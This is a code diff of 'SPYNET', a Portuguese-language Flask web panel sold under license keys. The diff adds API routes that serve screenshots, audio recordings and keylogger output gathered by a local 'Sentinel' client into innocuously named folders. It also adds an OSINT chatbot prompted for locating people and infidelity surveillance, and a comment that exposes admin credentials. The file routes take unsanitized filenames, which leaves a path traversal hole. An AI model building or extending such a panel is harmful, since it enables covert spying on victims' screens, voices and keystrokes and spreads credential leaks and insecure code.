@@ -1,18 +1,36 @@
 from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, jsonify, send_file
-import os, json, secrets
+import os, json, secrets, glob
 from datetime import datetime
 from functools import wraps
 
 app = Flask(__name__)
 
-app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
-ADMIN_USER = os.environ.get('ADMIN_USER')
-ADMIN_PASS = os.environ.get('ADMIN_PASS')
+# ==============================================
+# CONFIGURAÇÃO — variáveis de ambiente Render
+#   SECRET_KEY        = <gerado>
+#   ADMIN_USER        = Spynet2026
+#   ADMIN_PASS        = 246357@Net
+#   ANTHROPIC_API_KEY = sk-ant-...
+# ==============================================
+app.secret_key    = os.environ.get('SECRET_KEY', secrets.token_hex(32))
+ADMIN_USER        = os.environ.get('ADMIN_USER')
+ADMIN_PASS        = os.environ.get('ADMIN_PASS')
+ANTHROPIC_API_KEY = os.environ.get('ANTHROPIC_API_KEY', '')
 
+# Arquivos de dados
 CASOS_FILE  = 'data/casos.json'
 CHAVES_FILE = 'data/chaves_validas.json'
 os.makedirs('data', exist_ok=True)
 
+# Pasta do Sentinel (cliente local)
+SENTINEL_DIR   = os.environ.get('SENTINEL_DIR', 'SystemData')
+SCREENSHOT_DIR = os.path.join(SENTINEL_DIR, 'Cache')
+AUDIO_DIR      = os.path.join(SENTINEL_DIR, 'Temp')
+KEYLOG_PATH    = os.path.join(SENTINEL_DIR, 'Logs', 'syslog.txt')
+
+# ==============================================
+# HELPERS
+# ==============================================
 def carregar_casos():
     if os.path.exists(CASOS_FILE):
         with open(CASOS_FILE, 'r', encoding='utf-8') as f:
@@ -29,10 +47,8 @@ def carregar_chaves():
     try:
         with open(CHAVES_FILE, 'r', encoding='utf-8') as f:
             conteudo = f.read().strip()
-            if not conteudo:
-                return []
-            return json.loads(conteudo)
-    except (json.JSONDecodeError, Exception):
+            return json.loads(conteudo) if conteudo else []
+    except:
         return []
 
 def salvar_chaves(chaves):
@@ -47,11 +63,9 @@ def validar_chave(chave_digitada):
     for c in chaves:
         if c['chave'].upper() == chave_limpa:
             if not c.get('ativa', True):
-                return False, 'Licenca desativada. Entre em contato: contato@peterlima.com.br'
-            exp = c.get('expiracao_timestamp', 0)
-            if exp < datetime.now().timestamp():
-                venc = c.get('expiracao', '?')
-                return False, 'Licenca vencida em ' + venc + '. Renove seu plano.'
+                return False, 'Licenca desativada. Contato: contato@peterlima.com.br'
+            if c.get('expiracao_timestamp', 0) < datetime.now().timestamp():
+                return False, f'Licenca vencida em {c.get("expiracao","?")}. Renove seu plano.'
             c['ultimo_acesso'] = datetime.now().strftime('%d/%m/%Y %H:%M')
             salvar_chaves(chaves)
             return True, c
@@ -80,67 +94,76 @@ def add_security_headers(response):
     response.headers['X-XSS-Protection'] = '1; mode=block'
     return response
 
-ATIVAR_HTML = (
-    '<!DOCTYPE html>'
-    '<html lang="pt-br">'
-    '<head>'
-    '<meta charset="UTF-8">'
-    '<meta name="viewport" content="width=device-width, initial-scale=1.0">'
-    '<title>SPYNET - Ativacao de Licenca</title>'
-    '<link rel="icon" type="image/png" href="/static/logo.png">'
-    '<link rel="apple-touch-icon" href="/static/logo.png">'
-    '<style>'
-    '*{margin:0;padding:0;box-sizing:border-box}'
-    'body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;'
-    'background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);'
-    'min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}'
-    '.card{background:rgba(10,10,20,0.95);border-radius:24px;padding:40px 32px;'
-    'width:100%;max-width:460px;'
-    'box-shadow:0 25px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(0,255,255,0.2);text-align:center}'
-    'h1{color:#00ffff;font-size:26px;letter-spacing:3px;margin-bottom:6px}'
-    '.sub{color:#666;font-size:12px;letter-spacing:2px;margin-bottom:30px}'
-    'label{display:block;text-align:left;color:#00ffff;font-size:12px;'
-    'font-weight:600;letter-spacing:1px;margin-bottom:8px}'
-    'input{width:100%;padding:14px 16px;background:rgba(20,20,40,0.8);'
-    'border:1px solid #333;border-radius:12px;color:#fff;font-size:16px;'
-    'letter-spacing:2px;text-align:center;text-transform:uppercase;font-family:monospace}'
-    'input:focus{outline:none;border-color:#00ffff;box-shadow:0 0 12px rgba(0,255,255,0.3)}'
-    'input::placeholder{color:#444;font-size:14px}'
-    'button{width:100%;padding:14px;margin-top:20px;'
-    'background:linear-gradient(135deg,#00aaff,#0066cc);'
-    'color:white;border:none;border-radius:12px;font-size:16px;'
-    'font-weight:bold;cursor:pointer;letter-spacing:2px}'
-    '.erro{color:#ff4444;margin-top:16px;font-size:13px;padding:10px;'
-    'background:rgba(255,68,68,0.1);border-radius:8px}'
-    '.suporte{margin-top:24px;color:#444;font-size:11px}'
-    '.suporte a{color:#0af;text-decoration:none}'
-    '</style>'
-    '</head>'
-    '<body>'
-    '<div class="card">'
-    '<img src="/static/logo.png" alt="SPYNET"'
-    ' style="width:90px;height:90px;border-radius:18px;object-fit:contain;'
-    'margin:0 auto 16px;box-shadow:0 0 25px rgba(0,170,255,0.4);'
-    'background:#0a0a1a;padding:8px;display:block;">'
-    '<h1>SPYNET</h1>'
-    '<div class="sub">ATIVACAO DE LICENCA</div>'
-    '<form action="/ativar" method="POST">'
-    '<label>CHAVE DE ATIVACAO</label>'
-    '<input type="text" name="chave"'
-    ' placeholder="XXXX-XXXX-XXXX-XXXX-XXXX-XXXX"'
-    ' maxlength="29" required autocomplete="off"'
-    ' value="{{ chave_anterior }}">'
-    '<button type="submit">ATIVAR SISTEMA</button>'
-    '{% if erro %}<div class="erro">{{ erro }}</div>{% endif %}'
-    '</form>'
-    '<div class="suporte">'
-    'Nao tem chave? <a href="mailto:contato@peterlima.com.br">contato@peterlima.com.br</a>'
-    '</div>'
-    '</div>'
-    '</body>'
-    '</html>'
-)
+# ==============================================
+# TELA DE ATIVAÇÃO
+# ==============================================
+ATIVAR_HTML = '''<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPYNET - Ativacao de Licenca</title>
+    <link rel="icon" type="image/png" href="/static/logo.png">
+    <link rel="apple-touch-icon" href="/static/logo.png">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+             background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
+             min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
+        .card{background:rgba(10,10,20,0.95);border-radius:24px;padding:40px 32px;
+              width:100%;max-width:460px;text-align:center;
+              box-shadow:0 25px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(0,255,255,0.2)}
+        .logo{width:90px;height:90px;border-radius:18px;object-fit:contain;
+              margin:0 auto 16px;display:block;background:#0a0a1a;padding:8px;
+              box-shadow:0 0 25px rgba(0,170,255,0.4)}
+        h1{color:#00ffff;font-size:26px;letter-spacing:3px;margin-bottom:6px}
+        .sub{color:#666;font-size:12px;letter-spacing:2px;margin-bottom:30px;text-transform:uppercase}
+        label{display:block;text-align:left;color:#00ffff;font-size:12px;
+              font-weight:600;letter-spacing:1px;margin-bottom:8px}
+        input{width:100%;padding:14px 16px;background:rgba(20,20,40,0.8);
+              border:1px solid #333;border-radius:12px;color:#fff;font-size:16px;
+              letter-spacing:2px;text-align:center;text-transform:uppercase;
+              font-family:monospace;transition:0.3s}
+        input:focus{outline:none;border-color:#00ffff;box-shadow:0 0 12px rgba(0,255,255,0.3)}
+        input::placeholder{color:#444;font-size:14px;letter-spacing:4px}
+        button{width:100%;padding:14px;margin-top:20px;
+               background:linear-gradient(135deg,#00aaff,#0066cc);
+               color:white;border:none;border-radius:12px;font-size:16px;
+               font-weight:bold;cursor:pointer;letter-spacing:2px;transition:0.3s;
+               text-transform:uppercase}
+        button:hover{background:linear-gradient(135deg,#00ccff,#0088ee);transform:translateY(-2px)}
+        .erro{color:#ff4444;margin-top:16px;font-size:13px;padding:10px;
+              background:rgba(255,68,68,0.1);border-radius:8px;
+              border:1px solid rgba(255,68,68,0.3)}
+        .suporte{margin-top:24px;color:#444;font-size:11px}
+        .suporte a{color:#0af;text-decoration:none}
+    </style>
+</head>
+<body>
+<div class="card">
+    <img src="/static/logo.png" class="logo" alt="SPYNET"
+         onerror="this.src='https://placehold.co/90x90/0a0a1a/00ffff?text=SN'">
+    <h1>SPYNET</h1>
+    <div class="sub">Ativacao de Licenca</div>
+    <form action="/ativar" method="POST">
+        <label>CHAVE DE ATIVACAO</label>
+        <input type="text" name="chave"
+               placeholder="XXXX-XXXX-XXXX-XXXX-XXXX-XXXX"
+               maxlength="29" required autocomplete="off"
+               value="{{ chave_anterior or '' }}">
+        <button type="submit">🔑 ATIVAR SISTEMA</button>
+        {% if erro %}<div class="erro">{{ erro }}</div>{% endif %}
+    </form>
+    <div class="suporte">
+        Nao tem chave? <a href="mailto:contato@peterlima.com.br">contato@peterlima.com.br</a>
+    </div>
+</div>
+</body>
+</html>'''
 
+# ==============================================
+# ROTAS — ATIVAÇÃO E LOGIN
+# ==============================================
 @app.route('/ativar', methods=['GET', 'POST'])
 def ativar():
     if session.get('chave_validada'):
@@ -158,8 +181,7 @@ def ativar():
             session['plano']      = resultado.get('tipo', '')
             session['expiracao']  = resultado.get('expiracao', '')
             return redirect(url_for('login'))
-        else:
-            erro = resultado
+        erro = resultado
     return render_template_string(ATIVAR_HTML, erro=erro, chave_anterior=chave_anterior)
 
 @app.route('/')
@@ -188,6 +210,14 @@ def fazer_login():
         return redirect(url_for('dashboard'))
     return render_template('login.html', erro='Usuario ou senha incorretos!')
 
+@app.route('/sair')
+def sair():
+    session.clear()
+    return redirect(url_for('ativar'))
+
+# ==============================================
+# ROTAS — PÁGINAS
+# ==============================================
 @app.route('/dashboard')
 @login_obrigatorio
 @chave_obrigatoria
@@ -212,11 +242,9 @@ def osint():
 def casos():
     return render_template('casos.html', usuario=session['usuario'])
 
-@app.route('/sair')
-def sair():
-    session.clear()
-    return redirect(url_for('ativar'))
-
+# ==============================================
+# API — CASOS
+# ==============================================
 @app.route('/api/casos', methods=['GET'])
 @login_obrigatorio
 @chave_obrigatoria
@@ -272,10 +300,133 @@ def estatisticas():
         'status':          'online'
     })
 
+# ==============================================
+# API — SENTINEL (dados reais do cliente local)
+# ==============================================
+@app.route('/api/sentinel/screenshots')
+@login_obrigatorio
+@chave_obrigatoria
+def api_screenshots():
+    if not os.path.exists(SCREENSHOT_DIR):
+        return jsonify([])
+    arquivos = sorted(glob.glob(os.path.join(SCREENSHOT_DIR, '*.png')), reverse=True)[:12]
+    return jsonify([os.path.basename(f) for f in arquivos])
+
+@app.route('/api/sentinel/screenshot/<nome>')
+@login_obrigatorio
+@chave_obrigatoria
+def api_screenshot_file(nome):
+    path = os.path.join(SCREENSHOT_DIR, nome)
+    if os.path.exists(path):
+        return send_file(path, mimetype='image/png')
+    return '', 404
+
+@app.route('/api/sentinel/audios')
+@login_obrigatorio
+@chave_obrigatoria
+def api_audios():
+    if not os.path.exists(AUDIO_DIR):
+        return jsonify([])
+    arquivos = sorted(glob.glob(os.path.join(AUDIO_DIR, '*.wav')), reverse=True)[:6]
+    return jsonify([os.path.basename(f) for f in arquivos])
+
+@app.route('/api/sentinel/audio/<nome>')
+@login_obrigatorio
+@chave_obrigatoria
+def api_audio_file(nome):
+    path = os.path.join(AUDIO_DIR, nome)
+    if os.path.exists(path):
+        return send_file(path, mimetype='audio/wav')
+    return '', 404
+
+@app.route('/api/sentinel/keylog')
+@login_obrigatorio
+@chave_obrigatoria
+def api_keylog():
+    if not os.path.exists(KEYLOG_PATH):
+        return jsonify([])
+    try:
+        with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
+            linhas = f.readlines()[-100:]
+        return jsonify([l.strip() for l in linhas if l.strip()])
+    except:
+        return jsonify([])
+
+@app.route('/api/sentinel/stats')
+@login_obrigatorio
+@chave_obrigatoria
+def api_sentinel_stats():
+    ss  = len(glob.glob(os.path.join(SCREENSHOT_DIR, '*.png'))) if os.path.exists(SCREENSHOT_DIR) else 0
+    aud = len(glob.glob(os.path.join(AUDIO_DIR, '*.wav')))      if os.path.exists(AUDIO_DIR)      else 0
+    tec = 0
+    if os.path.exists(KEYLOG_PATH):
+        try:
+            with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
+                tec = len(f.readlines())
+        except:
+            pass
+    return jsonify({'screenshots': ss, 'audios': aud, 'teclas': tec})
+
+# ==============================================
+# API — FBI (IA OSINT via Anthropic)
+# ==============================================
+@app.route('/api/fbi', methods=['POST'])
+@login_obrigatorio
+@chave_obrigatoria
+def api_fbi():
+    if not ANTHROPIC_API_KEY:
+        return jsonify({'resposta': 'FBI offline: configure ANTHROPIC_API_KEY no Render.'})
+    data = request.get_json() or {}
+    mensagem  = data.get('mensagem', '').strip()
+    historico = data.get('historico', [])
+    if not mensagem:
+        return jsonify({'resposta': 'Digite uma pergunta.'})
+    FBI_SYSTEM = (
+        "Voce e o FBI (Ferramenta de Busca Inteligente), IA especialista em OSINT "
+        "e investigacao digital da SPYNET Security. Conhecimento: OSINT avancado, "
+        "redes sociais, Google Dorks, rastreamento de perfis, metadados, deepfakes, "
+        "CPF/CNPJ, localizacao de pessoas, infidelidade (legal), vigilancia digital, "
+        "LGPD, Sherlock/Maigret/Maltego, relatorios profissionais. "
+        "Responda em portugues brasileiro, profissional e pratico. Nao auxilie em atividades ilegais."
+    )
+    try:
+        import urllib.request as ur, ssl
+        msgs = [
+            {'role': 'user',      'content': FBI_SYSTEM},
+            {'role': 'assistant', 'content': 'Entendido. Sou o FBI da SPYNET. Como posso ajudar?'}
+        ]
+        for h in historico[-8:]:
+            if h.get('role') and h.get('content'):
+                msgs.append({'role': h['role'], 'content': h['content']})
+        payload = json.dumps({
+            'model': 'claude-haiku-4-5-20251001',
+            'max_tokens': 1000,
+            'messages': msgs
+        }).encode()
+        req = ur.Request(
+            'https://api.anthropic.com/v1/messages',
+            data=payload,
+            headers={
+                'Content-Type':      'application/json',
+                'anthropic-version': '2023-06-01',
+                'x-api-key':         ANTHROPIC_API_KEY
+            }
+        )
+        ctx = ssl.create_default_context()
+        with ur.urlopen(req, context=ctx, timeout=30) as r:
+            resp = json.loads(r.read().decode())
+        return jsonify({'resposta': resp['content'][0]['text']})
+    except Exception as e:
+        return jsonify({'resposta': f'Erro FBI: {str(e)[:150]}'})
+
+# ==============================================
+# INICIAR SERVIDOR
+# ==============================================
 if __name__ == '__main__':
     print("=" * 50)
     print("SPYNET SECURITY SYSTEM - ATIVADO")
     print("=" * 50)
+    print(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M')}")
     print("Acesse: http://localhost:5000")
     print("=" * 50)
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=False, host='0.0.0.0', port=5000)
